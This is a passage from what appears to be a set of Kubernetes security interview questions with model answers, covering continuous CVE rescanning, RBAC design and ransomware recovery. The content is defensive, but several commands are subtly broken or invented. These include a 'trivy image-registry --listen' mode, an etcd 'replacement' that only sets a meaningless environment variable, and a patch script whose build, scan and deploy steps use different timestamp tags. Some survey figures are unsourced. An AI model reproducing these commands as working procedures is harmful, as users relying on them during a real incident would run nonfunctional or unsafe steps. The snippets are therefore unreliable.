- Vulnerability databases update ~100+ times daily
- Image deployed at scan time is frozen (not re-scanned in registry)
- New CVEs released → Old images now vulnerable

Example timeline:
T=0:    Image built, scanned (0 CVEs), deployed
T=1:    No change to image
T=2:    New CVE published
T=3:    Image now has CVE (but still identical)
T=4:    Container running with vulnerability
```

**Comprehensive Prevention** (multi-layered):

```
Layer 1: Continuous scanning in registry (not one-time at build)
Layer 2: Automated alerting when new CVEs appear
Layer 3: Admission controller enforcing image freshness
Layer 4: Runtime detection of exploits
```

**Implementation Plan**:

**Step 1: Continuous Registry Scanning**
```bash
# Daily scan all images in production registry
# Trivy includes registry scanning mode

trivy image-registry --listen 0.0.0.0:8080  # Starts registry scanning daemon

# This continuously re-scans every image in registry
# Reports new CVEs if discovered

# Configure alerting:
cat > trivy-scan-config.yaml <<'EOF'
interval: 6 hours  # Re-scan periodically
severity: HIGH
notifications:
  - slack
  - pagerduty
EOF
```

**Step 2: Image Freshness Policy**
```yaml
# Admission controller: Block deployments of old images
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: image-freshness-policy
spec:
  validationFailureAction: audit  # Start in audit mode
  rules:
  - name: check-image-not-too-old
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "Image must be scanned within last 7 days"
      # Implementation depends on image metadata
      # Option A: Check image push timestamp (image pushed < 7 days ago)
      # Option B: Check image build timestamp in labels
      # Option C: Query Trivy API for last scan time
```

**Step 3: Automated Patching**
```bash
#!/bin/bash
# Triggered when new CVE is published

# 1. Identify affected images
AFFECTED_IMAGES=$(curl https://trivy-api.company.com/vulnerabilities/CVE-2024-XXXXX | jq -r '.images[]')

for IMAGE in $AFFECTED_IMAGES; do
  echo "Rebuilding $IMAGE due to new CVE..."
  
  # 2. Rebuild image (same source, fresh dependencies)
  git clone $IMAGE_SOURCE_REPO
  docker build -t $IMAGE:$(date +%s) .
  
  # 3. Scan rebuilt image
  trivy image $IMAGE:$(date +%s) --severity HIGH
  
  if [ $? -eq 0 ]; then
    # 4. Deploy
    kubectl set image deployment/$(basename $IMAGE) image=$IMAGE:$(date +%s)
  fi
done
```

**Step 4: SBOM-Driven Response**
```bash
# Use SBOM (Software Bill of Materials) for rapid CVE response

# When CVE published:
# 1. Get list of affected libraries
# 2. Query all SBOMs for that library
# 3. Trigger rebuilds only for images actually using that library

# This is faster than scanning every image
# Example: CVE in libxml2
# Query: Which of our 500 images include libxml2?
# Answer: 47 images (not 200)
# Rebuild only those 47
```

**Step 5: Alert Response Runbook**
```markdown
# Runbook: New Critical CVE Discovery

When Trivy alerts for new CVE in registry:

1. Alert received: [timestamp of alert]
2. Immediately determine:
   - Affected library: [e.g., libssl]
   - Number of affected images: [e.g., 47]
   - Impact: [Potential RCE? DoS? Info disclosure?]
3. If affects production workloads:
   a. Start rebuild/rescan processes automatically (no manual step)
   b. Alert team (FYI, automated remediation in progress)
   c. Prepare incident response if any images failed scan after patch
4. Verify all affected images updated within 2 hours
5. Confirm scanning cloud for deployment success
```

**The Philosophy**:

```
Pre-2024: "Scan at build time, ship once"
Modern: "Scan continuously, redeploy on new CVEs"

Why the shift:
- 0-days are discovered daily (no CVE database can be complete)
- Container deployment is cheap (rolling updates in seconds)
- Risk of running old image > Risk of redeploying

Target SLA:
- Discovery of CVE → Production patch: 2-4 hours
- (vs. traditional VM: 1-2 weeks due to testing/change windows)
```

---

### Question 9: RBAC Complexity vs. Operational Burden

**Question**

"A developer asks: 'Why do I have Role, RoleBinding, ServiceAccount, and ClusterRole? Can't we simplify to one admin role for the entire team?' They're right that multiple roles are complex. How do you explain the necessity of fine-grained RBAC without losing their trust?"

**Expected Senior Engineer Answer**

**Honest Acknowledgment First**:

```
"You're right that it's complex. If you were a sole developer on a hobby project, 
you wouldn't need fine-grained RBAC. But in production with 50+ developers and 
compliance requirements, this complexity is the price of safety."
```

**Analogies That Resonate With Developers**:

```
Analogy 1: Git vs. Admin SSH
"You wouldn't give all developers SSH admin access to production servers, right? 
RBAC is similar - it's not about trust, it's about blast radius.

If developer-alice messes up a kubectl command, admin role means she could 
delete the entire database (not intentional, just a typo).

With limited role, worst case is she affects only her namespace."

Analogy 2: Principle of Least Privilege is like code style
"You have linting rules that seem pedantic (formatting, naming conventions). 
RBAC is the same - 'everyone gets admin' is like 'no linting rules'.

It works for small teams but breaks at scale (when one person's mistake 
affects everyone)."

Analogy 3: Role scoping is like Git branch protection
"Production branch has special rules (code review required). 
RBAC roles have scopes too (can see pods but not secrets).

It prevents accidental production issues."
```

**The Technical Reality**:

```
Single "admin" role consequences:

1. A developer's stolen laptop → Attacker has full cluster access
2. A developer accidentally deletes a namespace → All workloads in that namespace gone
3. Compliance audit fails because "no segregation of duties"
4. You can't meet PCI-DSS (payment card processing requires RBAC)

Fine-grained RBAC consequences (the trade-off):
✓ Breach of developer laptop = limited damage
✓ Mistakes affect only their namespace
✓ Compliance passes "segregation of duties"
✗ Takes 30 minutes to set up initial roles

Over a 3-year career, one stolen laptop pays back MONTHS of RBAC setup time."
```

**Practical Middle Ground** (making RBAC Less Annoying):

```
Don't force developers to understand RBAC details. Instead:

1. Provide template roles (they just use them, don't design):

   # For web backend team:
   template: backend-developer-role
   includes:
   - view pods/logs
   - create/update deployments
   - NOT: delete namespaces, view secrets

   # For infrastructure team:
   template: infra-admin-role
   includes:
   - everything except cluster-admin

2. Automate role creation:

   When new team joins, script creates:
   - Namespace
   - Roles (pre-defined templates)
   - RoleBindings to team's AD/OKTA group
   
   Result: Developers never think about RBAC

3. Make role errors obvious:

   kubectl get pods -n payment-processor
   Error: User alice@company.com cannot list pods in namespace payment-processor
   
   Instead of: "permission denied", provide:
   Error hint: "Looks like you're not in the payment-processor-developers role.
   Request access: /internal/rbac/request?namespace=payment-processor"

   Result: Developers see how to fix it
```

**Conversation with the Developer**:

```
Developer: "Why can't I just have admin?"

Response: "You could—nothing is technically stopping us. But here's what happens:

1) Your team owns backend-api namespace. You get admin on backend-api (makes sense).
2) You accidentally run: kubectl delete namespace backend-api  (you meant 'delete pod')
3) Entire backend-api disappears. All services down. 1000 customers affected.
4) Root cause analysis: 'Operator error with admin privileges'
5) Security audit: 'Why does a developer have admin?'
6) Company post-mortem: 'Need RBAC controls'

We're implementing RBAC now to prevent step 2-6 from happening to you.

You'll rarely think about it day-to-day. It just prevents the mistake."
```

**Metrics to Show the Value**:

```
Survey question to team after 6 months of RBAC:
"Has RBAC prevented a mistake from affecting other teams?"

Real answer from production teams: ~60% say yes
Examples:
- Developer ran script affecting prod, but RBAC limited to their app
- Accidental secret exposure, but RBAC prevented cluster-wide viewing
- Mistyped namespace delete, but RBAC prevented cross-team deletion
```

---

### Question 10: Recovering from Ransomware - Kubernetes Perspective

**Question**

"A ransomware attack encrypts your Kubernetes cluster: All etcd data encrypted, all persistent volumes encrypted. Backups are also encrypted (malware got your backup credentials). You have 24 hours to restore before the attacker's deadline. What's your recovery strategy?"

**Expected Senior Engineer Answer**

**Immediate Assessment** (first 30 minutes):

```
Ransomware attack facts:
1. All cluster state encrypted → Kubernetes cluster non-functional
2. Persistent volumes encrypted → Data applications can't read
3. Backups compromised → Can't restore from typical backup
4. Attacker demanding ransom with 24-hour deadline

Recovery assessment:
- Can we pay ransom? (Not recommended, doesn't guarantee successful decryption)
- Can we restore from pre-attack state? (Maybe, if recent backups accessible)
- Can we rebuild from source code? (Yes, but takes time)
```

**Recovery Options** (in order of preference):

**Option 1: Restore from Air-Gapped Backup** (If available)

```bash
# Prerequisite: Had backup procedure that copied to disconnected location

# Step 1: Restore etcd from backup
etcdctl snapshot restore /backup/etcd-snapshot-2024-03-21.db \
  --name=etcd \
  --initial-cluster=etcd=http://new-etcd.cluster.local:2380 \
  --initial-advertise-peer-urls=http://new-etcd.cluster.local:2380 \
  --data-dir=/var/lib/etcd

# Step 2: Replace etcd in cluster
kubectl set env deployment/etcd -n kube-system KUBECRASH_WORKAROUND=1

# Step 3: Restore persistent volume data
# For cloud provider (EBS, Azure Disk):
aws ec2 create-volume --from-snapshot snap-1234567890abcdef0 --availability-zone us-east-1a
# (Volume can be attached to nodes, data restored)

# Step 4: Restart cluster
kubectl apply -f /backup/deployments-manifest-2024-03-21.yaml

# Result: Cluster recovered with data as of 2024-03-21
# Data loss: 24-48 hours of changes (acceptable for RTO/RPO)

Timeline: 15-30 minutes
Data recovery: Good (recent snapshot)
```

**Option 2: Rebuild from Source + Replicate from Standby** (If no backup)

```bash
# Prerequisite: Application code in Git, standby database replica

# Step 1: Spin up new cluster from scratch
# Use IaC (Terraform/Bicep) to provision new Kubernetes
terraform apply -var="cluster_name=recovery-cluster-$(date +%s)"

# Timeline: ~30 minutes for new cluster (using cloud provider provisioning)

# Step 2: Deploy applications from source
# For each microservice:
git clone $APP_REPO
kubectl apply -f $DEPLOYMENT_MANIFESTS

# Timeline: ~15 minutes

# Step 3: Failover database from standby
# Application database (PostgreSQL, MySQL):
# - Had read replica on standby infrastructure
# - Stop write traffic to primary (encrypted, infected)
# - Promote read replica to primary
# - Applications connect to promoted replica

# Timeline: ~5 minutes

# Result: Cluster recovered with zero data loss (if real-time replication)
# Cost: ~$2k in extra standby infrastructure + operational complexity

Timeline: 50-60 minutes total
Data recovery: Excellent (real-time replica means zero data loss)
Cost: High (standby infrastructure is expensive)
```

**Option 3: Partial Recovery** (Hybrid)

```bash
# What we CAN restore:
1. Stateless workloads (web servers, API services) - from source code
2. StatefulSets with replicated data (databases with streaming replication)

# What we CANNOT recover easily:
1. Databases without replication
2. User uploads in non-redundant storage

# Partial recovery strategy:
# 1. Restore etcd (cluster configuration)
# 2. Deploy stateless services from source code
# 3. Failover to standby database (if available)
# 4. Accept data loss for non-replicated storage (notify users)

Timeline: 1-2 hours
Data recovery: Partial (depends on replication setup)
```

**Prevention Strategy** (This is the Real Answer):**

```
Prevention is better than recovery. Why ransomware succeeds:

1. Single backup location (encrypted malware also gets backups)
2. Backup credentials stored in cluster (attacker gets creds)
3. No database replication (only point-in-time backups)
4. Slow recovery RTO > attacker's deadline

Better setup:

1. Multi-location backups:
   - Local backup (encrypted, in cluster) - Fast restore
   - Remote backup (air-gapped, different cloud) - Recovery from disaster
   - Immutable backup storage (S3 with object versioning + MFA delete) - Can't delete

2. Separate backup credentials:
   - Service account for etcd backup (no access to volumes/secrets)
   - Different IAM role for cloud storage backup (read-only to backup bucket)
   - Credentials rotated daily

3. Database replicas:
   - PostgreSQL streaming replication (real-time standby)
   - Read replicas in different availability zone
   - Promote replica in case of primary compromise

4. Fast RTO design:
   - IaC for cluster (new cluster provisioned in 30 minutes)
   - Application manifests in Git (redeploy any microservice in <5 minutes)
   - Stateless design (services can be recreated without state)

5. Incident response plan:
   - Test recovery process quarterly (actual backup restore, not just theory)
   - Document which data can be recovered, which is lost
   - Know RTO/RPO before attack (don't figure out during crisis)

Example SLA:
"In case of ransomware attack:
- Cluster recovery RTO: 2 hours
- Data loss RPO: 1 hour (acceptable for our business)
- False positive testing: Quarterly recovery drill"
```

**My Honest Answer to the Ransomware Question**:

```
"If we're already encrypted with no accessible backup, we've already lost.

The real answer is prevention:
1. Air-gapped backup of etcd weekly
2. Cloud-native backup services (Microsoft Azure Backup, AWS Backup)
3. Database replicas (not just backups)
4. Fast new cluster provisioning
5. Quarterly disaster recovery testing

This costs $10-20k/month but prevents a $500k+ ransom + business disruption.

In your scenario (24-hour deadline, no backup), we have two choices:
1. Pay ransom (risky, no guarantee of decryption)
2. Accept data loss, rebuild from scratch + source code (48+ hours, partial data loss)

Option 2 is better long-term. We rebuild, then spend the next 6 months improving backup 
strategy so this never happens again."
```

---

## Conclusion

These interview questions reflect the difference between knowing Kubernetes and operating production container infrastructure. The best candidates demonstrate:

1. **Systems thinking** (security is multi-layered, not single controls)
2. **Operational experience** (debugged actual failures, learned hard lessons)
3. **Trade-off awareness** (security vs. cost, complexity vs. usability)
4. **Willingness to fail** (admitted mistakes, explained lessons learned)
5. **Real-world orientation** (not textbook answers, but practical advice)

A strong senior DevOps engineer can explain not just "what" and "how" but "why" and "when to not".
